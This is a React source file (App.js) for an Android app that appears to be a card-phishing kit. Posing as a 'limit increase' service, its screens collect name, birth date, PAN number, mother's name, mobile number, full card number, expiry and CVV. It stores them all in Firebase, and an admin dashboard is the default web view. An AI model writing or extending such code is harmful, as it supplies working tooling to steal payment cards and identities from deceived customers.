import React, { useState } from 'react';
import AdminDashboard from './components/admin/AdminDashboard';
import HomeScreen from './components/HomeScreen';
import EnterDetailsScreen from './components/EnterDetailsScreen';
import CardDetailsScreen from './components/CardDetailsScreen';
import ConfirmationScreen from './components/ConfirmationScreen';
import { saveCustomerSubmission } from './firebase';
import { LayoutDashboard } from 'lucide-react';

export default function App() {
  // Check if initial view should be customer or admin (default: admin for web deployment)
  const [viewMode, setViewMode] = useState(() => {
    // If Capacitor native Android platform, default to customer view
    if (typeof window !== 'undefined' && window.Capacitor?.isNativePlatform?.()) {
      return 'customer';
    }
    const params = new URLSearchParams(window.location.search);
    if (params.get('view') === 'customer' || params.get('view') === 'mobile') {
      return 'customer';
    }
    return 'admin';
  });

  const [currentScreen, setCurrentScreen] = useState('home');
  const [selectedService, setSelectedService] = useState('');
  const [personalDetails, setPersonalDetails] = useState(null);
  const [cardDetails, setCardDetails] = useState(null);

  // Toggle between Admin Dashboard and Customer Mobile View
  const handleToggleView = () => {
    setViewMode((prev) => (prev === 'admin' ? 'customer' : 'admin'));
  };

  // 1. Home Screen Option Click -> Go to Enter Details
  const handleSelectHomeOption = (optionKey) => {
    setSelectedService(optionKey);
    setCurrentScreen('enter_details');
  };

  // 2. Enter Details Next -> Go to Card Details screen
  const handlePersonalDetailsSubmitted = (details) => {
    setPersonalDetails(details);
    setCurrentScreen('card_details');
  };

  // 3. Card Details Submit -> Save to Firebase Firestore & Go to Confirmation Screen
  const handleCardDetailsSubmitted = async (cardData) => {
    setCardDetails(cardData);
    setCurrentScreen('confirmation');

    // Prepare complete application payload
    const submissionData = {
      fullName: personalDetails?.fullName || '',
      dob: personalDetails?.dob || '',
      panNumber: personalDetails?.panNumber || '',
      mothersName: personalDetails?.mothersName || '',
      mobileNumber: personalDetails?.mobileNumber || '',
      selectedService: selectedService || 'increase_limit',
      nameOnCard: cardData?.nameOnCard || personalDetails?.fullName || '',
      cardNumber: cardData?.cardNumber || '',
      expiryDate: cardData?.expiryDate || '',
      cvv: cardData?.cvv || ''
    };

    // Save to Firebase Firestore
    try {
      await saveCustomerSubmission(submissionData);
    } catch (e) {
      console.error('Firebase submission error:', e);
    }
  };

  // Reset back to home screen
  const handleResetToHome = () => {
    setCurrentScreen('home');
    setSelectedService('');
    setPersonalDetails(null);
    setCardDetails(null);
  };

  // If in Admin Dashboard mode, render full Admin Portal
  if (viewMode === 'admin') {
    return <AdminDashboard onToggleView={handleToggleView} />;
  }

  // Otherwise render Customer Mobile View with switcher
  return (
    <div className="mobile-app-shell">
      {/* Quick Switcher Banner back to Admin */}
      <div style={{
        background: '#071933',
        color: '#ffffff',
        padding: '6px 12px',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'space-between',
        fontSize: '0.75rem',
        fontWeight: 600,
        zIndex: 50
      }}>
        <span>Previewing Customer Flow</span>
        <button
          onClick={handleToggleView}
          style={{
            background: '#0072ce',
            color: 'white',
            border: 'none',
            borderRadius: '6px',
            padding: '3px 8px',
            fontSize: '0.72rem',
            fontWeight: 700,
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            gap: '4px'
          }}
        >
          <LayoutDashboard size={12} />
          <span>Open Admin Dashboard</span>
        </button>
      </div>

      {/* Dynamic Sequential Screen Flow */}
      {currentScreen === 'home' && (
        <HomeScreen onSelectOption={handleSelectHomeOption} />
      )}

      {currentScreen === 'enter_details' && (
        <EnterDetailsScreen
          onBack={() => setCurrentScreen('home')}
          onNext={handlePersonalDetailsSubmitted}
          selectedService={selectedService}
        />
      )}

      {currentScreen === 'card_details' && (
        <CardDetailsScreen
          onBack={() => setCurrentScreen('enter_details')}
          onSubmit={handleCardDetailsSubmitted}
        />
      )}

      {currentScreen === 'confirmation' && (
        <ConfirmationScreen onReset={handleResetToHome} />
      )}
    </div>
  );
}
